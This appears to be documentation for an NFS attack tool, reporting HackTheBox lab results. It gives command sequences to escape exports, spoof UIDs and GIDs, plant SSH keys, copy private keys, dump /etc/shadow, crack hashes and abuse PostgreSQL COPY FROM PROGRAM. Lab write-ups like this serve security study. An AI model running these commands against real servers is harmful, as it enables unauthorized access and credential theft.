# HackTheBox results

Three NFS protocol weaknesses — [export escape](access-control/index.md) (F-2.1), [UID spoofing](identity/F-1.1-uid-gid-spoofing.md) (F-1.1), and [auxiliary GID injection](identity/F-1.3-auxiliary-group-injection.md) (F-1.3) — combine into attack chains that collapse multi-step exploitation paths into a few commands. On every writable Linux NFS export tested, nfswolf went from zero access to an SSH shell without touching any other service on the box.

The boxes below are HackTheBox machines designed as multi-step penetration testing challenges. Each has an intended path that chains together binary exploitation, web application vulnerabilities, or credential cracking before reaching a user shell. nfswolf bypasses those chains entirely when the NFS export is writable, and extracts every credential the intended path discovers when it is not.

---

## Writable exports: escape → shell

On these boxes, nfswolf plants an SSH key or steals an existing private key through the escaped handle, then logs in directly. The intended path never touches NFS for initial access — it uses unrelated vulnerabilities that nfswolf makes unnecessary.

### Jail — Insane (XFS)

The intended path requires exploiting a stack buffer overflow with shellcode to land a shell as `nobody`, then creating a local user and compiling a SUID binary on the NFS share to escalate to frank.

```
nfswolf escape --privileged-port <target>
nfswolf shell --privileged-port --nfs-version 3 -u 1000 -g 1000 --allow-write <target> --handle <escaped> -c 'put key.pub /home/frank/.ssh/authorized_keys'
ssh -i key frank@<target>
```

| Result | |
|--------|-|
| Export escape | XFS inode 64 — 5 OS-ESCAPE handles |
| Shell | frank (uid 1000) — planted `authorized_keys` |
| `/etc/shadow` | Not readable (shadow group hardened) |

### Squashed — Easy (Ext4)

The intended path requires creating local users with matching UIDs, writing a PHP webshell to the NFS-mounted web root, catching a reverse shell, then stealing an X11 session cookie from a second NFS share and screenshotting the desktop to find the root password.

```
nfswolf escape --privileged-port <target>
nfswolf shell --privileged-port --nfs-version 3 -u 2017 -g 2017 --allow-write <target> --handle <escaped> -c 'mkdir /home/alex/.ssh'
nfswolf shell --privileged-port --nfs-version 3 -u 2017 -g 2017 --allow-write <target> --handle <escaped> -c 'put key.pub /home/alex/.ssh/authorized_keys'
ssh -i key alex@<target>
```

| Result | |
|--------|-|
| Export escape | Ext4 inode 2 — 5 OS-ESCAPE handles |
| Shell | alex (uid 2017) + ross (uid 1001) — planted `authorized_keys` |
| `/etc/shadow` | Root hash readable via `--aux-gids 42` (F-1.3) |

### Clicker — Medium (Ext4)

The intended path requires exploiting a mass assignment vulnerability with newline injection for admin access, writing a PHP webshell through the admin export function, catching a reverse shell, then abusing a SetUID binary with directory traversal to read jack's SSH key.

```
nfswolf escape --privileged-port <target>
nfswolf shell --privileged-port --nfs-version 3 -u 1000 -g 1000 <target> --handle <escaped> -c 'get /home/jack/.ssh/id_rsa /tmp/jack_key'
ssh -i /tmp/jack_key jack@<target>
```

| Result | |
|--------|-|
| Export escape | Ext4 inode 2 — 3 OS-ESCAPE handles |
| Shell | jack (uid 1000) — exfiltrated existing `id_rsa` (filesystem read-only, key plant not possible) |
| `/etc/shadow` | Root hash readable via `--aux-gids 42` (F-1.3) |
| Bonus | jack is in `sudo` group; site backup zip readable |

---

## Read-only exports: escape → credential extraction

On these boxes, exports are mounted read-only (`ro` in `/etc/exports`), so nfswolf cannot plant keys or write files. The export escape still provides full filesystem read access, which extracts every credential the intended path spends multiple steps discovering. The remaining exploitation steps start from known passwords rather than blind enumeration.

### Slonik — Medium (Ext4)

The intended path uses netexec to break out of exports, reads `/etc/shadow` and `.psql_history`, cracks the service hash, tunnels through SSH to a PostgreSQL UNIX socket, and uses `COPY FROM PROGRAM` to plant a key for the postgres user.

nfswolf replaces the first half of that chain — the escape and credential extraction — in three commands:

```
nfswolf escape --privileged-port <target>
nfswolf shell --privileged-port --nfs-version 3 -u 0 -g 42 --aux-gids 42 <target> --handle <escaped> -c 'cat /etc/shadow'
nfswolf shell --privileged-port --nfs-version 3 -u 1337 -g 1337 <target> --handle <escaped> -c 'cat /home/service/.psql_history'
```

The PostgreSQL tunnel chain is still needed for shell access:

```
john --wordlist=rockyou.txt shadow.txt
ssh -L 5432:/var/run/postgresql/.s.PGSQL.5432 service@<target>
psql -h localhost -U postgres -c "COPY ... FROM PROGRAM 'echo key >> /var/lib/postgresql/.ssh/authorized_keys'"
ssh postgres@<target>
```

| Result | |
|--------|-|
| Export escape | Ext4 inode 2 — 6 OS-ESCAPE handles |
| `/etc/shadow` | Root + service hashes via `--aux-gids 42` (F-1.3) |
| Credentials | `.psql_history` leaks DB password MD5 |
| Shell | Indirect — exports are `ro`; service user has `/bin/false` |

### Enigma — Easy (Ext4)

The intended path mounts the NFS share to find an onboarding PDF with webmail credentials, logs into Roundcube, password-sprays other accounts, finds OpenSTAManager admin credentials in email, exploits a command injection CVE, then cracks a bcrypt hash from the MySQL database to escalate to haris.

nfswolf extracts every credential that chain discovers — and more — in four commands:

```
nfswolf escape --privileged-port <target>
nfswolf shell --privileged-port --nfs-version 3 -u 0 -g 0 <target> --handle <escaped> -c 'get /srv/nfs/onboarding/New_Employee_Access.pdf /tmp/onboarding.pdf'
nfswolf shell --privileged-port --nfs-version 3 -u 0 -g 42 --aux-gids 42 <target> --handle <escaped> -c 'cat /etc/shadow'
john --wordlist=<(echo 'Enigma2024!') shadow.txt
```

Two of five shadow hashes crack instantly with the password from the onboarding PDF. Roundcube MySQL credentials and the DES encryption key are also readable from `config.inc.php` via the escaped handle. The web exploitation chain is still needed for shell access, but starts from known credentials.

| Result | |
|--------|-|
| Export escape | Ext4 inode 2 — 3 OS-ESCAPE handles |
| `/etc/shadow` | 5 hashes via `--aux-gids 42` (F-1.3) — 2 cracked |
| Credentials | Plaintext password in onboarding PDF; Roundcube MySQL password + DES key |
| Shell | Indirect — exports are `ro` |

---

## Summary

Every Linux NFS export tested was escaped via crafted file handles (F-2.1). Every box with a writable export was shelled in 3-4 commands. Every box with GID 42 in the shadow group leaked `/etc/shadow` via auxiliary GID injection (F-1.3).

| | Writable exports | Read-only exports |
|-|-------------------|-------------------|
| **Boxes** | Jail, Squashed, Clicker | Slonik, Enigma |
| **Export escape** | 3/3 | 2/2 |
| **Shell via NFS** | 3/3 | 0/2 (credentials extracted) |
| **`/etc/shadow`** | 2/3 | 2/2 |

!!! info "Limitations"

    `root_squash` blocked root-level writes on every box — no box was rootable through NFS alone. All escapes required NFSv3 with a privileged source port (`--privileged-port`). UID spoofing (F-1.1) depends on [AUTH_SYS](../nfs/authentication.md), which Kerberos-authenticated exports would prevent.
